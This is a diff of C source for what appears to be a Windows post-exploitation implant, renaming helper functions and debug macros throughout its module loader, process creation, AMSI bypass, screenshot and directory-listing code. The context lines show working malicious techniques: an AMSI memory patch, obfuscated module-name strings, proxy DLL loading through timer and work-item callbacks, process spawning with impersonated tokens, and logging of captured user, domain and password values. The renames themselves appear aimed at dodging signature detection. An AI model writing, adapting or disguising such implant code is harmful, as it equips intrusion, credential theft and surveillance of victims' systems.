@@ -143,12 +143,12 @@ PVOID LoaderModPeBStr(
                 return Ldr->DllBase;
             }
 
-            MemZero( Naamhota, MAX_PATH );
+            MemeZ( Naamhota, MAX_PATH );
         }
     }
 
     if ( Naamhota ) {
-        MemZero( Naamhota, MAX_PATH );
+        MemeZ( Naamhota, MAX_PATH );
         MmHeapFree( Naamhota );
         Naamhota = NULL;
     }
@@ -170,11 +170,11 @@ PVOID LoaderModSea(
     WCHAR                 Name[ 260 ] = { 0 };
     WCHAR                 LLd[ 5 ]    = { 0 };
 
-    LLd[ 3 ] = HideChar( 'L' );
-    LLd[ 1 ] = HideChar( 'D' );
-    LLd[ 4 ] = HideChar( '\0' );
-    LLd[ 2 ] = HideChar( 'L' );
-    LLd[ 0 ] = HideChar( '.' );
+    LLd[ 3 ] = HiChara( 'L' );
+    LLd[ 1 ] = HiChara( 'D' );
+    LLd[ 4 ] = HiChara( '\0' );
+    LLd[ 2 ] = HiChara( 'L' );
+    LLd[ 0 ] = HiChara( '.' );
 
     Ent      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
     Secondent = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
@@ -186,18 +186,18 @@ PVOID LoaderModSea(
         StringConcatW( Name, LLd );
     }
 
-    MemZero( LLd, sizeof( LLd ) );
+    MemeZ( LLd, sizeof( LLd ) );
 
     do
     {
         if ( ! StringCompareIW( Name, Ent->BaseDllName.Buffer ) ) {
-            MemZero( Name, sizeof( Name ) );
+            MemeZ( Name, sizeof( Name ) );
             return Ent->DllBase;
         }
         Ent = Ent->InLoadOrderLinks.Flink;
     } while ( Ent != Secondent );
 
-    MemZero( Name, sizeof( Name ) );
+    MemeZ( Name, sizeof( Name ) );
     return NULL;
 }
 
@@ -249,7 +249,7 @@ PVOID LoaderModLod(
         /* load library using RtlRegisterWait + LoadLibraryW */
         if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && Instance->Win32.RtlRegisterWait )
         {
-            PUTS( "Loading Mod using RtlRegisterWait" )
+            STUP( "Loading Mod using RtlRegisterWait" )
 
             /* create an event for end of Mod loading */
             if ( ! NT_SUCCESS( NtStatus = SysNtCreateEvent( &Event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
@@ -266,7 +266,7 @@ PVOID LoaderModLod(
         /* load library using RtlCreateTimer + LoadLibraryW */
         else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && Instance->Win32.RtlCreateTimer )
         {
-            PUTS( "Loading Mod using RtlCreateTimer" )
+            STUP( "Loading Mod using RtlCreateTimer" )
 
             /* create timer queue */
             if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue ) ) ) {
@@ -283,7 +283,7 @@ PVOID LoaderModLod(
         /* load library using RtlQueueWorkItem + LoadLibraryW */
         else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance->Win32.RtlQueueWorkItem )
         {
-            PUTS( "Loading Mod using RtlQueueWorkItem" )
+            STUP( "Loading Mod using RtlQueueWorkItem" )
 
             /* call LoadLibraryW and load specified Mod */
             if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlQueueWorkItem( C_PTR( Instance->Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
@@ -322,7 +322,7 @@ PVOID LoaderModLod(
 
         /* if Mod still hasn't been found then go to default */
         if ( ! Mod ) {
-            PUTS( "Mod was not loaded, try with default technique" )
+            STUP( "Mod was not loaded, try with default technique" )
             goto DEFAULT;
         }
     }
@@ -332,7 +332,7 @@ PVOID LoaderModLod(
         /* load library using LdrLoadDll */
         if ( Instance->Win32.LdrLoadDll )
         {
-            PUTS( "Loading Mod using LdrLoadDll" )
+            STUP( "Loading Mod using LdrLoadDll" )
 
             /* prepare unicode string */
             UnicodeString.Buffer        = NameW;
@@ -348,8 +348,8 @@ PVOID LoaderModLod(
 
 END:
     /* clear stuff from stack */
-    MemZero( NameW, sizeof( NameW ) );
-    MemZero( &UnicodeString, sizeof( UnicodeString ) );
+    MemeZ( NameW, sizeof( NameW ) );
+    MemeZ( &UnicodeString, sizeof( UnicodeString ) );
 
     PRINTF( "Mod \"%s\": %p\n", ModNm, Mod )
 
@@ -603,7 +603,7 @@ BOOL ProcessCreate(
 
     if ( Piped )
     {
-        PUTS( "Piped enabled" )
+        STUP( "Piped enabled" )
         AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
         AnonPipesInit( AnonPipe );
@@ -614,7 +614,7 @@ BOOL ProcessCreate(
     }
 
     if ( DataAnonPipes ) {
-        PUTS( "Using specified anon pipes" )
+        STUP( "Using specified anon pipes" )
         StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
         StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
         StartUpInfo.hStdInput  = NULL;
@@ -623,7 +623,7 @@ BOOL ProcessCreate(
 #if _M_IX86
     if ( ! x86 && Instance->Win32.Wow64DisableWow64FsRedirection )
     {
-        PUTS( "Enable Wow64 process support" )
+        STUP( "Enable Wow64 process support" )
         if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
         {
             PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
@@ -638,7 +638,7 @@ BOOL ProcessCreate(
 
     if ( Instance->Tokens.Impersonate )
     {
-        PUTS( "Impersonate" )
+        STUP( "Impersonate" )
 
         LPWSTR lpCurrentDirectory   = NULL;
         WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
@@ -668,7 +668,7 @@ BOOL ProcessCreate(
                 }
             }
 
-            PUTS( "CreateProcessWithTokenW" )
+            STUP( "CreateProcessWithTokenW" )
             if ( ! Instance->Win32.CreateProcessWithTokenW(
                     PrimaryToken,
                     LOGON_NETCREDENTIALS_ONLY,
@@ -690,7 +690,7 @@ BOOL ProcessCreate(
         }
         else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
-            PUTS( "CreateProcessWithLogonW" )
+            STUP( "CreateProcessWithLogonW" )
             PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
             if ( ! Instance->Win32.CreateProcessWithLogonW(
                     Instance->Tokens.Token->lpUser,
@@ -736,7 +736,7 @@ BOOL ProcessCreate(
     /* Check if we managed to spawn a process */
     if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
     {
-        PUTS( "Send info back" )
+        STUP( "Send info back" )
         if ( ! CmdLine )
         {
             PackageAddWString( Package, App );
@@ -754,7 +754,7 @@ BOOL ProcessCreate(
             // remove the arguments. we are just interested in the process name/path
             for ( ; i < x; i++ ) {
                 if ( s[ i ] == ' ' ) break;
-            } PUTS( s )
+            } STUP( s )
             s[ i ] = 0;
 
             PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );
@@ -828,7 +828,7 @@ BOOL ProcessTerminate(
     if ( NT_SUCCESS( NtStatus ) ) {
         Success = TRUE;
     } else {
-        PUTS( "Failed to terminate process" )
+        STUP( "Failed to terminate process" )
     }
 
 END:
@@ -894,7 +894,7 @@ BOOL ReadLocalFile(
 
     hFile = Instance->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) ) {
-        PUTS( "CreateFileW: Failed" )
+        STUP( "CreateFileW: Failed" )
         PACKAGE_ERROR_WIN32
         goto Cleanup;
     }
@@ -903,7 +903,7 @@ BOOL ReadLocalFile(
     *FileContent = Instance->Win32.LocalAlloc( LPTR, *FileSize );
 
     if ( ! Instance->Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
-        PUTS( "ReadFile: Failed" )
+        STUP( "ReadFile: Failed" )
         PACKAGE_ERROR_WIN32
         goto Cleanup;
     }
@@ -940,18 +940,18 @@ BOOL BypassPatchAMSI(
     unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
 #endif
 
-    Mod[0] = HideChar('A');
-    Mod[1] = HideChar('M');
-    Mod[2] = HideChar('S');
-    Mod[3] = HideChar('I');
-    Mod[4] = HideChar('.');
-    Mod[5] = HideChar('D');
-    Mod[6] = HideChar('L');
-    Mod[7] = HideChar('L');
-    Mod[8] = HideChar('\0');
+    Mod[0] = HiChara('A');
+    Mod[1] = HiChara('M');
+    Mod[2] = HiChara('S');
+    Mod[3] = HiChara('I');
+    Mod[4] = HiChara('.');
+    Mod[5] = HiChara('D');
+    Mod[6] = HiChara('L');
+    Mod[7] = HiChara('L');
+    Mod[8] = HiChara('\0');
 
     hModAmsi = LoaderModLod( Mod );
-    MemZero( Mod, sizeof( Mod ) );
+    MemeZ( Mod, sizeof( Mod ) );
 
     PRINTF( "[+] Loaded asmi.dll: %p\n", hModAmsi );
 
@@ -972,7 +972,7 @@ BOOL BypassPatchAMSI(
             return TRUE;
         }
 
-        PUTS( "[-] Failed to change back protection" )
+        STUP( "[-] Failed to change back protection" )
     }
 
     return FALSE;
@@ -1008,7 +1008,7 @@ VOID AnonPipesRead(
     DWORD    dwBufferSize    = 0;
     DWORD    dwRead          = 0;
 
-    PUTS( "Start reading anon pipe" )
+    STUP( "Start reading anon pipe" )
     PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )
 
     if ( AnonPipes->StdOutWrite ) {
@@ -1079,18 +1079,18 @@ BOOL WinScreenshot(
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
-        PUTS( "GetDC failed" )
+        STUP( "GetDC failed" )
         goto Cleanup;
     }
 
     hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
     if ( ! hTempMap ) {
-        PUTS( "GetCurrentObject failed" )
+        STUP( "GetCurrentObject failed" )
         goto Cleanup;
     }
 
     if ( ! Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops ) ) {
-        PUTS( "GetObjectW failed" )
+        STUP( "GetObjectW failed" )
         goto Cleanup;
     }
 
@@ -1112,24 +1112,24 @@ BOOL WinScreenshot(
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
-        PUTS( "CreateCompatibleDC failed" )
+        STUP( "CreateCompatibleDC failed" )
         goto Cleanup;
     }
 
     hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
     if ( ! hBitmap ) {
-        PUTS( "CreateDIBSection failed" )
+        STUP( "CreateDIBSection failed" )
         goto Cleanup;
     }
 
     ObjPtr = Instance->Win32.SelectObject( hMemDC, hBitmap );
     if ( ! ObjPtr || ObjPtr == HGDI_ERROR ) {
-        PUTS( "SelectObject failed" )
+        STUP( "SelectObject failed" )
         goto Cleanup;
     }
 
     if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY ) ) {
-        PUTS( "BitBlt failed" )
+        STUP( "BitBlt failed" )
         goto Cleanup;
     }
 
@@ -1504,7 +1504,7 @@ PROOT_DIR listDir(
     BOOL             Success       = FALSE;
 
     if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
-        PUTS( "Invalid arguments" )
+        STUP( "Invalid arguments" )
         goto Cleanup;
     }
 
@@ -1512,7 +1512,7 @@ PROOT_DIR listDir(
     Path = Instance->Win32.LocalAlloc( LPTR, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
     if ( ! Path )
     {
-        PUTS( "Failed to allocate memory" );
+        STUP( "Failed to allocate memory" );
         goto Cleanup;
     }
 
@@ -1552,7 +1552,7 @@ PROOT_DIR listDir(
     RootDir = Instance->Win32.LocalAlloc( LPTR, sizeof( ROOT_DIR ) );
     if ( ! RootDir )
     {
-        PUTS( "Failed to allocate memory" );
+        STUP( "Failed to allocate memory" );
         goto Cleanup;
     }
 
@@ -1589,7 +1589,7 @@ PROOT_DIR listDir(
             SubDir = Instance->Win32.LocalAlloc( LPTR, sizeof( SUB_DIR ) );
             if ( ! SubDir )
             {
-                PUTS( "Failed to allocate memory" );
+                STUP( "Failed to allocate memory" );
                 goto Cleanup;
             }
 
@@ -1640,7 +1640,7 @@ PROOT_DIR listDir(
         DirOrFile = Instance->Win32.LocalAlloc( LPTR, sizeof( DIR_OR_FILE ) );
         if ( ! DirOrFile )
         {
-            PUTS( "Failed to allocate memory" );
+            STUP( "Failed to allocate memory" );
             goto Cleanup;
         }
 
